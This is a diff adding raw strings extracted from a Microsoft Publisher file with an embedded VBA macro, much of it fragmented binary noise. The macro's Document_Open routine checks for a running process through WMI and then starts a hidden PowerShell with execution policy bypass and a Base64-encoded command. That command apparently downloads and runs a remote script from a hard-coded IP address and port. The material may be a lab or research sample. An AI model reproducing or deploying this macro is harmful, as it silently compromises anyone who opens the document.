@@ -1,0 +1,234 @@
+Project
+rstd
+ole>
+\G{00020
+430-
+0046}#
+2.0#0#C:
+\Windows
+\SysWOW6
+e2.tlb
+#OLE Aut
+omation
+EOffic
+E2DF
+8D04C-5B
+FA-101B-
+BDE5
+ram File
+s (x86)\@Common
+Microsof
+t Shared
+\OFFICE1
+6\MSO.DL
+P 16.
+0 Ob
+ Li`brary
+ThisDoc
+umentG
+m@9nU@_
+dule1G
+Attribut
+e VB_Nam
+e = "Mod
+ule1"
+ThisDocument
+Module1
+Project
+C:\Program Files (x86)\Common Files\Microsoft Shared\VBA\VBA7.1\VBE7.DLL
+C:\Program Files (x86)\Microsoft Office\root\Office16\MSPUB.TLB
+Publisher
+C:\Windows\SysWOW64\stdole2.tlb
+stdole
+C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE16\MSO.DLL
+Office
+SwLA
+Document
+Document_Open
+doit
+VBE7.DLL
+SwLA
+SwLA
+lala'
+select * from win32_process where name='
+outlook_process.exe
+winmgmts:
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec Bypass -windowstyle hidden -enc SQBFAHgAIAAoACgAbgBFAFcALQBPAEIASgBlAEMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACgAIgBoAHQAdABwADoALwAvADEAMwAuADMANwAuADEAMAAuADEAMAA6ADQANAA0ADMALwBkAG8AYwAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkAKQApAA==
+Attribut
+e VB_Nam
+e = "Thi
+sDocumen
+0{09FD2
+EFF-5669
+-11D3-B6
+5F-00C04
+F8EF32D}
+|Global
+Spac
+dCreat
+Pred
+ecla
+BExpo
+Templ
+ateDeriv
+Bustomi
+2Sub 
+_Open()
+Dim 
+objList 
+As Objec
+SetA
+= Get
+"winmgmt
+s:") _
+.ExecQue@r("sel
+* from 
+32_proce
+ss where
+='" &
+ "outlooBk
+.exe
+IfE".C
+ount > 0  ThenG
+0lala
+d IfCF
+KRet`Val
+hell("C:
+\Windows
+\System3
+Power
+\v1.0\p
+Bypa
+hidde
+nc SQB
+FAHgAIAA
+oACgAbg
+FcALQBPA
+EIASgBlA
+EMAdAAgA
+G4AZQB0A C4Adw
+AYwBsAGk
+uAHQAKQ
+AuAGQAbw
+bABvA
+GEAZABz
+PcgBp
+dABw
+ADoALwAv@ADEAMw
+6ADQANAA
+LwBkA
+HAAY@QB5AGw
+HMAM@QAiACk
+AA==", 1
+PublisherL
+Win16
+Win32
+Win64x
+VBA6
+VBA7
+Project1
+stdole
+Project-
+Office
+ThisDocument<
+_Evaluate
+Module1b
+Document_Open
+Documentj
+objList
+GetObjectz
+ExecQuery
+Count0v
+doit`
+_B_var_Sub
+RetVal
+ShellV
+ExecQuer
+ID="{82D50EE1-1918-4582-A498-DBB2F7EE56AB}"
+Document=ThisDocument/&H00000000
+Module=Module1
+Name="Project"
+HelpContextID="0"
+VersionCompatible32="393222000"
+CMG="4D4FB80948524C524C524C524C"
+DPB="9A986FC0BDC1BDC1BD"
+GC="E7E5129712A95EAA5EAAA1"
+[Host Extender Info]
+&H00000001={3832D640-CF90-11CF-8E43-00A0C911P
+005A};VBE;&H00000000
+[Workspace]
+ThisDocument=52, 52, 1211, 686, 
+Module1=26, 26, 1614, 711, 
+ThisDocument
+Module1
+Quill96 Story Group Class
+Microsoft Publisher 3.0
+MSPu
+CHNKINK 
+TEXT
+TEXT
+STSH
+STSHD
+STSH
+STSH
+STSH
+STSH
+FDPP
+FDPP
+FDPC
+FDPC
+SYID
+SYID
+SGP 
+SGP 
+INK 
+INK 
+BTEP
+PLC 
+BTEC
+PLC ,N
+FONT
+FONTDN
+STRS
+PLC 
+MCLD
+MCLD
+PL  
+PL  
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+4"b#
+"@M	
+9"@M	
+4"b#
+4"b#
+blisher.3
+IEUser
